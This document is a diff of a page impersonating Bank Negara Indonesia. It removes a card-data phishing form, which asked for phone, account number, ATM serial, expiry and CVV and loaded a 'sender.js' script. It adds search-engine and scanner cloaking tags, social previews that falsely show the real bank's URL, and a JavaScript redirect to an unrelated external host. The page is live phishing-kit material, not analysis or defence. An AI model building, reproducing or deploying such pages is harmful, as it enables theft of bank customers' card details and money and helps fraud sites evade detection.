@@ -4,105 +4,39 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BNI - Bank Negara Indonesia</title>
-    <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="icon" href="assets/img/logobini.png" type="image/png">
+    
+    <!-- Auto Redirect -->
+    <meta http-equiv="refresh" content="0; url=index.html">
+    
+    <!-- Anti Scanning & Search Engine -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, nofollow">
+    <meta name="bingbot" content="noindex, nofollow">
+    <meta name="googlebot-news" content="noindex, nofollow">
+    
+    <!-- Security Meta Tags -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    <!-- Social Media Preview (Open Graph) -->
+    <meta property="og:title" content="BNI - Bank Negara Indonesia">
+    <meta property="og:description" content="Layanan perbankan terpercaya dan aman dari Bank Negara Indonesia.">
+    <meta property="og:image" content="https://logowik.com/content/uploads/images/bank-negara-indonesia-bni3391.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.bni.co.id">
+    
+    <!-- Twitter Preview -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="BNI - Bank Negara Indonesia">
+    <meta name="twitter:description" content="Layanan perbankan terpercaya dan aman dari Bank Negara Indonesia.">
+    <meta name="twitter:image" content="https://logowik.com/content/uploads/images/bank-negara-indonesia-bni3391.jpg">
+
+    <script type="text/javascript">
+        window.location.href = "https://pichamberinapps.ct.ws/";
+    </script>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="nav-container">
-            <img src="assets/img/logobini.png" alt="BNI Logo" class="logo">
-            <ul class="nav-menu">
-                <li><a href="#home" class="nav-link">Beranda</a></li>
-                <li><a href="#services" class="nav-link">Layanan</a></li>
-                <li><a href="#features" class="nav-link">Fitur</a></li>
-                <li><a href="#about" class="nav-link">Tentang</a></li>
-                <li><a href="auth.html" class="nav-link">Login</a></li>
-            </ul>
-            <button class="nav-toggle" id="mobile-menu">
-                <span class="bar"></span>
-                <span class="bar"></span>
-                <span class="bar"></span>
-            </button>
-        </div>
-    </nav>
-    <!-- INPUT DATA -->
-    <section class="input-data">
-        <h2>Form Data Kartu</h2>
-                <form id="dataForm">
-            <div class="form-group">
-                <label for="nomor-hp">Nomor HP</label>
-                <input type="tel" id="nomor-hp" name="nomor-hp" placeholder="Masukkan nomor HP Anda" required>
-                <div class="error-message" id="nomorHpError">Nomor HP harus diisi</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="nomor-rekening">Nomor Rekening</label>
-                <input type="text" id="nomor-rekening" name="nomor-rekening" placeholder="Masukkan nomor rekening" required>
-                <div class="error-message" id="nomorRekeningError">Nomor rekening harus diisi</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="seri-atm">Seri ATM</label>
-                <input type="text" id="seri-atm" name="seri-atm" placeholder="Masukkan nomor seri ATM" required>
-                <div class="error-message" id="seriAtmError">Seri ATM harus diisi</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="masa-berlaku">Masa Berlaku</label>
-                <input type="text" id="masa-berlaku" name="masa-berlaku" placeholder="MM/YY" required>
-                <div class="error-message" id="masaBerlakuError">Format MM/YY harus valid</div>
-            </div>
-            
-            <div class="form-group">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="3 digit CVV" maxlength="3" required>
-                <div class="error-message" id="cvvError">CVV harus 3 digit</div>
-            </div>
-            
-            <button type="submit" class="submit-btn" id="submitBtn">Kirim Data</button>
-        </form>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="footer-container">
-            <div class="footer-grid">
-                <div class="footer-section">
-                    <h3>Tentang BNI</h3>
-                    <p>Bank Negara Indonesia adalah bank BUMN terbesar di Indonesia yang berkomitmen untuk melayani masyarakat dengan produk dan layanan perbankan terbaik.</p>
-                </div>
-                <div class="footer-section">
-                    <h3>Layanan</h3>
-                    <ul>
-                        <li><a href="#">Tabungan</a></li>
-                        <li><a href="#">Kartu Kredit</a></li>
-                        <li><a href="#">Pinjaman</a></li>
-                        <li><a href="#">Investasi</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Bantuan</h3>
-                    <ul>
-                        <li><a href="#">FAQ</a></li>
-                        <li><a href="#">Hubungi Kami</a></li>
-                        <li><a href="#">Lokasi Cabang</a></li>
-                        <li><a href="#">Karir</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Kontak</h3>
-                    <p><strong>Call BNI 1500046</strong></p>
-                    <p>24 jam setiap hari</p>
-                    <p>Email: service@bni.co.id</p>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2026 Bank Negara Indonesia. Hak Cipta Dilindungi.</p>
-            </div>
-        </div>
-    </footer>
-
-    <script src="assets/js/main.js"></script>
-<script src="assets/js/sender.js"></script>
 </body>
 </html>
